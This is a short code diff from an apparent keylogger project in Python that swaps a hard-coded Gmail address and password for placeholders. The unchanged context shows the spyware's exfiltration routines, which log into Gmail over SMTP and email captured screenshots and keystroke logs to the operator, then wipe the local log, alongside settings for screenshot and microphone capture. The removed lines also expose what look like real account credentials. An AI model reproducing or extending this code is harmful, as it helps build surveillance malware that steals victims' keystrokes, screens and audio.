@@ -35,9 +35,9 @@ key = "hpcGE5hdtMeYyrM9BW3p7FsWc_VZ-0sE8Fb5WxKpY_Y="
 max_ss = 12
 time_iteration = 25
 number_of_iterations_end = 2
-email_address = "practicalcns@gmail.com"
-password = "Test_123_practical"
-toAddr = "practicalcns@gmail.com"
+email_address = "xyz@gmail.com"
+password = "xyz"
+toAddr = "xyz@gmail.com"
 microphone_time = 23
 
 file_path = "C:\\Users\\shash\\PycharmProjects\\Keylogger\\Project"
@@ -128,8 +128,8 @@ def send_ss():
 
     s = smtplib.SMTP('smtp.gmail.com', 587)
     s.starttls()
-    s.login("practicalcns@gmail.com", "Test_123_practical")
-    s.sendmail("practicalcns@gmail.com", "practicalcns@gmail.com", msg.as_string())
+    s.login("xyz@gmail.com", "xyz")
+    s.sendmail("xyz@gmail.com", "xyz@gmail.com", msg.as_string())
     s.quit()
 
 
@@ -171,8 +171,8 @@ def send_mail():
 
     s = smtplib.SMTP('smtp.gmail.com', 587)
     s.starttls()
-    s.login("practicalcns@gmail.com", "Test_123_practical")
-    s.sendmail("practicalcns@gmail.com", "practicalcns@gmail.com", msg.as_string())
+    s.login("xyz@gmail.com", "xyz")
+    s.sendmail("xyz@gmail.com", "xyz@gmail.com", msg.as_string())
     s.quit()
     with open(file_path + extend + keys_information, "w") as f:
         f.write("")
